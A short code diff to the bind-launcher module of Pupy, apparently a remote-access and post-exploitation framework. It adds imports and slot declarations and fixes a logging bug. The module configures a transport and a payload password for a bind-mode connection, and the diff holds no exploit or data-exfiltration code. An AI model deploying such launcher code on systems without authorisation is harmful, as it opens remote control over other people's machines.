@@ -2,12 +2,22 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+__all__ = [ 'BindLauncher' ]
+
+import network
+import logging
+import argparse
+
+from network.lib import utils
+
 from ..base_launcher import *
 
 class BindLauncher(BaseLauncher):
     """ start a simple bind launcher with the specified transport """
 
     credentials = [ 'BIND_PAYLOADS_PASSWORD' ]
+
+    __slots__ = ( 'credentials', 'arg_parser', 'args', 'rhost', 'rport' )
 
     def init_argparse(self):
         self.arg_parser = LauncherArgumentParser(prog="bind", description=self.__doc__)
@@ -34,7 +44,7 @@ class BindLauncher(BaseLauncher):
             if val.lower() in t.server_transport_kwargs:
                 transport_kwargs[val.lower()]=opt_args[val]
             else:
-                logging.warning("unknown transport argument : %s"%tab[0])
+                logging.warning("unknown transport argument : %s"%val)
         t.parse_args(transport_kwargs)
         logging.info("using transports options: %s"%transport_kwargs)
         if t.authenticator:
